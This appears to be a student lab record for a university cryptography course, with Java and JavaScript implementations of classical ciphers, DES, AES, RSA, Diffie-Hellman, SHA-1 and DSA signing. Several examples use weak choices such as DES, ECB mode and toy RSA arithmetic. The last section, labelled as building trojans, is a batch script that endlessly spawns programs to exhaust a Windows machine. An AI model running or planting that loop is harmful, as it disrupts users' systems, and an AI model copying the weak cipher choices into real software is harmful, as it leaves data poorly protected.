# 22CS701 - Cryptography

## Experiment 1 & 2

### 1(a). Caesar Cipher

```java
class caesarCipher {
    public static String encode(String enc, int offset) {
        offset = offset % 26 + 26;
        StringBuilder encoded = new StringBuilder();

        for (char i : enc.toCharArray()) {
            if (Character.isLetter(i)) {
                if (Character.isUpperCase(i)) {
                    encoded.append((char) ('A' + (i - 'A' + offset) % 26));
                } else {
                    encoded.append((char) ('a' + (i - 'a' + offset) % 26));
                }
            } else {
                encoded.append(i);
            }
        }
        return encoded.toString();
    }
    public static String decode(String enc, int offset) {
        return encode(enc, 26 - offset);
    }

    public static void main(String[] args) throws java.lang.Exception {
        String msg = "Anna University";
        System.out.println("Simulating Caesar Cipher\n------------------------");
        System.out.println("Input : " + msg);
        System.out.println("Encrypted Message : " + caesarCipher.encode(msg, 3));
        System.out.println("Decrypted Message : " + caesarCipher.decode(caesarCipher.encode(msg, 3), 3));
    }
}
```

---

### 1(b). Playfair Cipher

```java
import java.awt.Point;

class playfairCipher {

    private static char[][] charTable;
    private static Point[] positions;

    private static String prepareText(String s, boolean chgJtoI) {
        s = s.toUpperCase().replaceAll("[^A-Z]", "");
        return chgJtoI ? s.replace("J", "I") : s.replace("Q", "");
    }

    private static void createTbl(String key, boolean chgJtoI) {
        charTable = new char[5][5];
        positions = new Point[26];
        String s = prepareText(key + "ABCDEFGHIJKLMNOPQRSTUVWXYZ", chgJtoI);
        int len = s.length();
        for (int i = 0, k = 0; i < len; i++) {
            char c = s.charAt(i);
            if (positions[c - 'A'] == null) {
                charTable[k / 5][k % 5] = c;
                positions[c - 'A'] = new Point(k % 5, k / 5);
                k++;
            }
        }
    }

    private static String codec(StringBuilder txt, int dir) {
        int len = txt.length();
        for (int i = 0; i < len; i += 2) {
            char a = txt.charAt(i);
            char b = txt.charAt(i + 1);
            int row1 = positions[a - 'A'].y;
            int row2 = positions[b - 'A'].y;
            int col1 = positions[a - 'A'].x;
            int col2 = positions[b - 'A'].x;

            if (row1 == row2) {
                col1 = (col1 + dir) % 5;
                col2 = (col2 + dir) % 5;
            } else if (col1 == col2) {
                row1 = (row1 + dir) % 5;
                row2 = (row2 + dir) % 5;
            } else {
                int tmp = col1;
                col1 = col2;
                col2 = tmp;
            }

            txt.setCharAt(i, charTable[row1][col1]);
            txt.setCharAt(i + 1, charTable[row2][col2]);
        }

        return txt.toString();
    }

    private static String encode(String s) {
        StringBuilder sb = new StringBuilder(s);
        for (int i = 0; i < sb.length(); i += 2) {
            if (i == sb.length() - 1) {
                sb.append(sb.length() % 2 == 1 ? 'X' : "");
            } else if (sb.charAt(i) == sb.charAt(i + 1)) {
                sb.insert(i + 1, 'X');
            }
        }
        return codec(sb, 1);
    }

    private static String decode(String s) {
        return codec(new StringBuilder(s), 4);
    }

    public static void main(String[] args) throws java.lang.Exception {
        String key = "CSE";
        String txt = "Security Lab";
        boolean chgJtoI = true;
        createTbl(key, chgJtoI);
        String enc = encode(prepareText(txt, chgJtoI));
        System.out.println("Simulating Playfair Cipher\n----------------------");
        System.out.println("Input Message : " + txt);
        System.out.println("Encrypted Message : " + enc);
        System.out.println("Decrypted Message : " + decode(enc));
    }
}
```

---

### 1(c). Hill Cipher

```java
class hillCipher {

    public static int[][] keymat = { { 1, 2, 1 }, { 2, 3, 2 }, { 2, 2, 1 } };
    public static int[][] invkeymat = { { -1, 0, 1 }, { 2, -1, 0 }, { -2, 2, -1 } };
    public static String key = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

    private static String encode(char a, char b, char c) {
        int posa = a - 65, posb = b - 65, posc = c - 65;
        int x = posa * keymat[0][0] + posb * keymat[1][0] + posc * keymat[2][0];
        int y = posa * keymat[0][1] + posb * keymat[1][1] + posc * keymat[2][1];
        int z = posa * keymat[0][2] + posb * keymat[1][2] + posc * keymat[2][2];
        return "" + key.charAt(x % 26) + key.charAt(y % 26) + key.charAt(z % 26);
    }

    private static String decode(char a, char b, char c) {
        int posa = a - 65, posb = b - 65, posc = c - 65;
        int x = posa * invkeymat[0][0] + posb * invkeymat[1][0] + posc * invkeymat[2][0];
        int y = posa * invkeymat[0][1] + posb * invkeymat[1][1] + posc * invkeymat[2][1];
        int z = posa * invkeymat[0][2] + posb * invkeymat[1][2] + posc * invkeymat[2][2];
        return "" + key.charAt((x % 26 + 26) % 26) + key.charAt((y % 26 + 26) % 26) + key.charAt((z % 26 + 26) % 26);
    }

    public static void main(String[] args) {
        String msg = "SecurityLaboratory".toUpperCase().replaceAll("\\s", "");
        int n = msg.length() % 3;
        if (n != 0) {
            for (int i = 1; i <= (3 - n); i++) msg += 'X';
        }
        String enc = "", dec = "";
        for (int i = 0; i < msg.length(); i += 3)
            enc += encode(msg.charAt(i), msg.charAt(i + 1), msg.charAt(i + 2));
        for (int i = 0; i < enc.length(); i += 3)
            dec += decode(enc.charAt(i), enc.charAt(i + 1), enc.charAt(i + 2));
        System.out.println("Encoded: " + enc);
        System.out.println("Decoded: " + dec);
    }
}
```

---

### 1(d). Vigenere Cipher

```java
public class vigenereCipher {

    static String encode(String text, final String key) {
        String res = "";
        text = text.toUpperCase();
        for (int i = 0, j = 0; i < text.length(); i++) {
            char c = text.charAt(i);
            if (c < 'A' || c > 'Z') continue;
            res += (char) ((c + key.charAt(j) - 2 * 'A') % 26 + 'A');
            j = ++j % key.length();
        }
        return res;
    }

    static String decode(String text, final String key) {
        String res = "";
        text = text.toUpperCase();
        for (int i = 0, j = 0; i < text.length(); i++) {
            char c = text.charAt(i);
            if (c < 'A' || c > 'Z') continue;
            res += (char) ((c - key.charAt(j) + 26) % 26 + 'A');
            j = ++j % key.length();
        }
        return res;
    }

    public static void main(String[] args) {
        String key = "VIGENERECIPHER";
        String msg = "SecurityLaboratory";
        System.out.println("Encrypted Message : " + encode(msg, key));
        System.out.println("Decrypted Message : " + decode(encode(msg, key), key));
    }
}
```

---

### 2(a). RailFence Cipher

```java
public class RailFenceCipher {
    public static String encode(String msg, int depth) {
        int r = depth;
        int l = msg.length();
        int c = (int) Math.ceil((double) l / depth);
        int k = 0;
        char[][] mat = new char[r][c];
        String enc = "";
        for (int i = 0; i < c; i++) {
            for (int j = 0; j < r; j++) {
                if (k < l) {
                    mat[j][i] = msg.charAt(k++);
                } else {
                    mat[j][i] = 'X'; // padding if needed
                }
            }
        }

        for (int i = 0; i < r; i++) {
            for (int j = 0; j < c; j++) {
                enc += mat[i][j];
            }
        }
        return enc;
    }
    public static String decode(String encmsg, int depth) {
        int r = depth;
        int l = encmsg.length();
        int c = l / depth;
        int k = 0;
        char[][] mat = new char[r][c];
        String dec = "";

        for (int i = 0; i < r; i++) {
            for (int j = 0; j < c; j++) {
                mat[i][j] = encmsg.charAt(k++);
            }
        }

        for (int i = 0; i < c; i++) {
            for (int j = 0; j < r; j++) {
                dec += mat[j][i];
            }
        }

        return dec;
    }

    public static void main(String[] args) {
        String msg = "Anna University, Chennai";
        int depth = 2;

        String enc = encode(msg, depth);
        String dec = decode(enc, depth);

        System.out.println("Simulating Rail Fence Cipher\n----------------------------");
        System.out.println("Input Message      : " + msg);
        System.out.println("Encrypted Message  : " + enc);
        System.out.println("Decrypted Message  : " + dec);
    }
}
```

---

### 2(b). Row and Column Cipher

```java
import java.util.*;

class TransCipher {
    public static void main(String args[]) {
        Scanner sc = new Scanner(System.in);
        System.out.println("Enter the plain text");
        String pl = sc.nextLine();
        sc.close();
        String s = pl.replaceAll(" ", "");
        int k = s.length(), l = 0, col = 4;
        int row = (int) Math.ceil((double) k / col);
        char[][] ch = new char[row][col];
        for (int i = 0; i < row; i++)
            for (int j = 0; j < col; j++)
                ch[i][j] = l < k ? s.charAt(l++) : '#';
        char[][] trans = new char[col][row];
        for (int i = 0; i < row; i++)
            for (int j = 0; j < col; j++)
                trans[j][i] = ch[i][j];
        for (int i = 0; i < col; i++)
            for (int j = 0; j < row; j++)
                System.out.print(trans[i][j]);
    }
}
```

---

## Experiment 3 & 4

### 3. DES (Data Encryption Standard)

```java
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.security.*;

public class DES {

    public static void main(String[] args) {
        try {
            System.out.println("Message Encryption Using DES Algorithm\n--------------------------------------");

            // Generate secret DES key
            KeyGenerator keyGenerator = KeyGenerator.getInstance("DES");
            SecretKey myDesKey = keyGenerator.generateKey();

            // Create Cipher instance with DES algorithm
            Cipher desCipher = Cipher.getInstance("DES/ECB/PKCS5Padding");

            // Hardcoded message
            String message = "Secret Information";
            byte[] text = message.getBytes();

            System.out.println("Original Message     : " + message);

            // Encrypt the message
            desCipher.init(Cipher.ENCRYPT_MODE, myDesKey);
            byte[] encryptedText = desCipher.doFinal(text);
            System.out.println("Encrypted (Raw Bytes): " + new String(encryptedText));

            // Decrypt the message
            desCipher.init(Cipher.DECRYPT_MODE, myDesKey);
            byte[] decryptedText = desCipher.doFinal(encryptedText);
            System.out.println("Decrypted Message    : " + new String(decryptedText));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

---

### 4. AES (Advanced Encryption Standard)

```java
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.security.MessageDigest;
import java.util.Base64;
import java.util.Arrays;

public class AES {

    private static SecretKeySpec secretKey;
    private static byte[] key;

    // Set the key from a string (hardcoded)
    public static void setKey(String myKey) {
        try {
            key = myKey.getBytes("UTF-8");
            MessageDigest sha = MessageDigest.getInstance("SHA-1");
            key = sha.digest(key);
            key = Arrays.copyOf(key, 16); // Use first 128 bits
            secretKey = new SecretKeySpec(key, "AES");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Encrypt method
    public static String encrypt(String strToEncrypt, String secret) {
        try {
            setKey(secret);
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);
            return Base64.getEncoder().encodeToString(cipher.doFinal(strToEncrypt.getBytes("UTF-8")));
        } catch (Exception e) {
            System.out.println("Error while encrypting: " + e.toString());
        }
        return null;
    }

    // Decrypt method
    public static String decrypt(String strToDecrypt, String secret) {
        try {
            setKey(secret);
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5PADDING");
            cipher.init(Cipher.DECRYPT_MODE, secretKey);
            return new String(cipher.doFinal(Base64.getDecoder().decode(strToDecrypt)));
        } catch (Exception e) {
            System.out.println("Error while decrypting: " + e.toString());
        }
        return null;
    }

    public static void main(String[] args) {
        final String secretKey = "annaUniversity";
        final String originalString = "www.annauniv.edu";

        System.out.println("URL Encryption Using AES Algorithm\n----------------------------------");
        System.out.println("Original URL   : " + originalString);

        String encryptedString = encrypt(originalString, secretKey);
        System.out.println("Encrypted URL  : " + encryptedString);

        String decryptedString = decrypt(encryptedString, secretKey);
        System.out.println("Decrypted URL  : " + decryptedString);
    }
}
```

---

## Experiment 5, 6 & 7

### 5. RSA Algorithm

```html
<html>
<head>
  <title>RSA Encryption</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<center>
  <h1>RSA Algorithm</h1>
  <h2>Implemented Using HTML & JavaScript</h2>
  <hr>
  <table>
    <tr>
      <td>Enter First Prime Number:</td>
      <td><input type="number" value="53" id="p"></td>
    </tr>
    <tr>
      <td>Enter Second Prime Number:</td>
      <td><input type="number" value="59" id="q"></td>
    </tr>
    <tr>
      <td>Enter the Message (as number, A=1, B=2,...):</td>
      <td><input type="number" value="89" id="msg"></td>
    </tr>
    <tr><td>Public Key:</td><td><p id="publickey"></p></td></tr>
    <tr><td>Exponent:</td><td><p id="exponent"></p></td></tr>
    <tr><td>Private Key:</td><td><p id="privatekey"></p></td></tr>
    <tr><td>Cipher Text:</td><td><p id="ciphertext"></p></td></tr>
    <tr><td><button onclick="RSA();">Apply RSA</button></td></tr>
  </table>
</center>
</body>

<script>
function RSA() {
  function gcd(a, b) { return (!b) ? a : gcd(b, a % b); }

  let p = parseInt(document.getElementById('p').value);
  let q = parseInt(document.getElementById('q').value);
  let msg = parseInt(document.getElementById('msg').value);

  let n = p * q;
  let t = (p - 1) * (q - 1);
  let e, d, i, x;

  for (e = 2; e < t; e++) if (gcd(e, t) == 1) break;

  for (i = 0; i < 10; i++) {
    x = 1 + i * t;
    if (x % e == 0) { d = x / e; break; }
  }

  let ct = Math.pow(msg, e) % n;
  let dt = Math.pow(ct, d) % n;

  document.getElementById('publickey').innerText = n;
  document.getElementById('exponent').innerText = e;
  document.getElementById('privatekey').innerText = d;
  document.getElementById('ciphertext').innerText = ct;
}
</script>
</html>
```

---

### 6. Diffie-Hellman Key Exchange Algorithm

```java
class DiffieHellman {
  public static void main(String args[]) {
    int p = 23; // Publicly known prime number
    int g = 5;  // Primitive root
    int x = 4;  // Alice's secret
    int y = 3;  // Bob's secret

    double aliceSends = (Math.pow(g, x)) % p;
    double bobComputes = (Math.pow(aliceSends, y)) % p;
    double bobSends = (Math.pow(g, y)) % p;
    double aliceComputes = (Math.pow(bobSends, x)) % p;
    double sharedSecret = (Math.pow(g, (x * y))) % p;

    System.out.println("Simulation of Diffie-Hellman Key Exchange Algorithm\n---------------------------------------------------");
    System.out.println("Alice Sends : " + aliceSends);
    System.out.println("Bob Computes : " + bobComputes);
    System.out.println("Bob Sends : " + bobSends);
    System.out.println("Alice Computes : " + aliceComputes);
    System.out.println("Shared Secret : " + sharedSecret);

    if ((aliceComputes == sharedSecret) && (aliceComputes == bobComputes))
      System.out.println("Success: Shared Secrets Match! " + sharedSecret);
    else
      System.out.println("Error: Shared Secrets do not Match!");
  }
}
```

---

### 7. SHA-1 Algorithm

```java
import java.security.*;

public class sha1 {
  public static void main(String[] a) {
    try {
      MessageDigest md = MessageDigest.getInstance("SHA1");
      System.out.println("Message digest object info:\n-----------------");
      System.out.println("Algorithm=" + md.getAlgorithm());
      System.out.println("Provider=" + md.getProvider());
      System.out.println("ToString=" + md.toString());

      String input = "";
      md.update(input.getBytes());
      byte[] output = md.digest();
      System.out.println("\nSHA1(\"" + input + "\")=" + bytesToHex(output));

      input = "abc";
      md.update(input.getBytes());
      output = md.digest();
      System.out.println("\nSHA1(\"" + input + "\")=" + bytesToHex(output));

      input = "abcdefghijklmnopqrstuvwxyz";
      md.update(input.getBytes());
      output = md.digest();
      System.out.println("\nSHA1(\"" + input + "\")=" + bytesToHex(output));
    } catch (Exception e) {
      System.out.println("Exception: " + e);
    }
  }

  private static String bytesToHex(byte[] b) {
    char hexDigit[] = {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
    StringBuffer buf = new StringBuffer();
    for (byte aB : b) {
      buf.append(hexDigit[(aB >> 4) & 0x0f]);
      buf.append(hexDigit[aB & 0x0f]);
    }
    return buf.toString();
  }
}
```

---

### 8. Digital Signature Standard

```java
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.Signature;
import java.util.Scanner;
import java.util.Base64;

public class CreatingDigitalSignature {

    public static void main(String[] args) throws Exception {
        Scanner sc = new Scanner(System.in);
        System.out.println("Enter some text:");
        String msg = sc.nextLine();

        KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance("DSA");
        keyPairGen.initialize(2048);

        KeyPair pair = keyPairGen.generateKeyPair();
        PrivateKey privKey = pair.getPrivate();

        Signature sign = Signature.getInstance("SHA256withDSA");
        sign.initSign(privKey);

        byte[] bytes = msg.getBytes();
        sign.update(bytes);

        byte[] signature = sign.sign();

        // Print signature in Base64
        System.out.println("Digital signature for the given text:");
        System.out.println(Base64.getEncoder().encodeToString(signature));
    }
}

```

---

### 11(a). Defeating Malware - Building Trojans

```bat
@echo off
:x
start mspaint
start notepad
start cmd
start explorer
start control
start calc
goto x
```